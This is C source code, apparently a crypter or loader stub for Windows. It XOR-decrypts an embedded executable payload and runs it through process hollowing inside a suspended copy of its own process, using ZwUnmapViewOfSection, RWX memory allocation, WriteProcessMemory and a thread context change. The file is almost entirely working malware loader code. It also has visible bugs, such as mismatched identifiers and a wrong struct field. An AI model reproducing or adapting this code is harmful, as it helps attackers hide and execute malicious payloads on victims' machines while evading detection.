int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    Decrypt();
    RunPE();

    return EXIT_SUCCESS;
}

VOID Decrypt(VOID)
{
    int i;
    for (i = 0; i < sizeof(Shellcode); i++)
    {
        Shellcode[i] ^= Key[i % sizeof(Key)];
    }
}

typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);

VOID RunPE(VOID)
{
    // check valid DOS signature
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
    if (pidh->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    // check valid PE signature
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh->e_lfanew);
    if (pinh->Signature != IMAGE_NT_SIGNATURE)
        return;

    // get own full file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // initialize startup and process information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    // required to set size of si.cb before use
    si.cb = sizeof(si);
    // create suspended process
    CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    // obtain thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.Thread, &ctx);

    // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
    fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    // hollow process at virtual memory address 'pinh->OptionalHeader.ImageBase'
    pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

    // allocate virtual memory at address 'pinh->OptionalHeader.ImageBase' of size `pinh->OptionalHeader.SizeofImage` with RWX permissions
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // write header
    WriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, Shellcode, pinh->OptionalHeader.SizeOfHeaders, NULL);

    // write each section
    int i;
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++)
    {
        // calculate and get ith section
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
        // write section data
        WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish->VirtualAddress), (LPVOID)((DWORD)Shellcode + pish->PointerToRawData), pish->SizeOfRawData, NULL);
    }

    // set appropriate address of entry point
    ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // resume and execute our application
    ResumeThread(pi.hThread);
}